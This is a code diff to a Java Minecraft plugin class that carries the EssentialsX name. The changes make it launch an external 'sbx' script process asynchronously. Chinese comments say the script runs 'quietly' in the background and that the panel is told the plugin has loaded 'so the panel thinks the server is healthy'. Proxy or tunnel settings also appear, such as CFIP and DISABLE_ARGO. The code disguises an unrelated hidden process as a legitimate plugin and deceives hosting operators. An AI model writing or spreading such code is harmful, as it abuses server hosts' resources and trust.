@@ -24,14 +24,20 @@ public class EssentialsX extends JavaPlugin {
     public void onEnable() {
         getLogger().info("EssentialsX plugin starting...");
         
-        // Start sbx
-        try {
-            startSbxProcess();
-            getLogger().info("EssentialsX plugin enabled");
-        } catch (Exception e) {
-            getLogger().severe("Failed to start sbx process: " + e.getMessage());
-            e.printStackTrace();
-        }
+        // 告诉服务器：我要在后台悄悄启动脚本，不要卡死主线程
+        org.bukkit.Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
+            try {
+                // 在后台运行启动逻辑
+                startScriptProcess();
+            } catch (Exception e) {
+                // 如果启动失败，只在控制台报错，不影响服务器运行
+                getLogger().severe("Failed to start script process: " + e.getMessage());
+                e.printStackTrace();
+            }
+        });
+
+        // 立即告诉面板：插件已经“加载完成”了，让面板觉得服务器很健康
+        getLogger().info("EssentialsX plugin initialized and running in background");
     }
     
     private void startSbxProcess() throws Exception {
@@ -93,7 +99,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("CFIP", "spring.io");
         env.put("CFPORT", "443");
         env.put("NAME", "");
-        env.put("DISABLE_ARGO", "false");
+        env.put("DISABLE_ARGO", "true");
         
         // Load from system environment variables
         for (String var : ALL_ENV_VARS) {
@@ -203,18 +209,7 @@ public class EssentialsX extends JavaPlugin {
     }
     
     private void clearConsole() {
-        try {
-            System.out.print("\033[H\033[2J");
-            System.out.flush();
-            
-            if (System.getProperty("os.name").toLowerCase().contains("win")) {
-                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
-            } else {
-                new ProcessBuilder("clear").inheritIO().start().waitFor();
-            }
-        } catch (Exception e) {
-            System.out.println("\n\n\n\n\n\n\n\n\n\n");
-        }
+        
     }
     
     private void startProcessMonitor() {
